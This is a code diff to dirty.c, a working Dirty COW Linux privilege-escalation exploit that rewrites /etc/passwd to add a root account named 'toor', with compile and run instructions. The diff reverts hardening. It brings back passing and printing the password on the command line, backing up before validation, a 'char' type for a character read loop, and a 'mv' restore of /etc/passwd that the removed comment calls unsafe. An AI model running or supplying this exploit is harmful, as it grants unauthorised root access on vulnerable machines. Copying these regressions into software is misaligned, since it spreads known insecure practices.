@@ -9,19 +9,24 @@
 //
 // To use this exploit modify the user values according to your needs.
 //   The default is "toor".
-
+//
+// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
+//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
+//
 // Compile with:
 //   gcc -pthread dirty.c -o dirty -lcrypt
 //
-// Then run the newly created binary with "./dirty". It prompts without
-// putting the chosen password in the command line or terminal output.
+// Then run the newly create binary by either doing:
+//   "./dirty" or "./dirty my-new-password"
 //
 // Afterwards, you can either "su toor" or "ssh toor@..."
 //
-// Restore /etc/passwd from the root shell after proving UID 0. Copy into
-// the existing file, then verify ownership and mode; moving the backup
-// would replace the root-owned inode with a file owned by the attacker.
-
+// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
+//   mv /tmp/passwd.bak /etc/passwd
+//
+// Exploit adopted by Christian "firefart" Mehlmauer
+// https://firefart.at
+//
 
 #include <fcntl.h>
 #include <pthread.h>
@@ -87,7 +92,7 @@ int copy_file(const char *from, const char *to) {
     return -1;
   }
 
-  int ch;
+  char ch;
   FILE *source, *target;
 
   source = fopen(from, "r");
@@ -115,10 +120,10 @@ int copy_file(const char *from, const char *to) {
 
 int main(int argc, char *argv[])
 {
-  (void)argv;
-  if (argc != 1) {
-    fprintf(stderr, "Run ./dirty without a password argument.\n");
-    return 2;
+  // backup file
+  int ret = copy_file(filename, backup_filename);
+  if (ret != 0) {
+    exit(ret);
   }
 
   struct Userinfo user;
@@ -130,20 +135,18 @@ int main(int argc, char *argv[])
   user.home_dir = "/root";
   user.shell = "/bin/bash";
 
-  char *plaintext_pw = getpass("Please enter the new password: ");
-  if (plaintext_pw == NULL || plaintext_pw[0] == '\0') {
-    fprintf(stderr, "A nonempty password is required.\n");
-    return 2;
+  char *plaintext_pw;
+
+  if (argc >= 2) {
+    plaintext_pw = argv[1];
+    printf("Please enter the new password: %s\n", plaintext_pw);
+  } else {
+    plaintext_pw = getpass("Please enter the new password: ");
   }
 
   user.hash = generate_password_hash(plaintext_pw);
   char *complete_passwd_line = generate_passwd_line(user);
-
-  // Back up only after the password has been accepted.
-  int ret = copy_file(filename, backup_filename);
-  if (ret != 0) {
-    exit(ret);
-  }
+  printf("Complete line:\n%s\n", complete_passwd_line);
 
   f = open(filename, O_RDONLY);
   fstat(f, &st);
@@ -182,9 +185,9 @@ int main(int argc, char *argv[])
   }
 
   printf("Done! Check %s to see if the new user was created.\n", filename);
-  printf("You can log in with the username '%s' and the password you entered.\n\n",
-    user.username);
-  printf("\nRESTORE /etc/passwd from %s after proving UID 0.\n",
-    backup_filename);
+  printf("You can log in with the username '%s' and the password '%s'.\n\n",
+    user.username, plaintext_pw);
+    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
+    backup_filename, filename);
   return 0;
 }
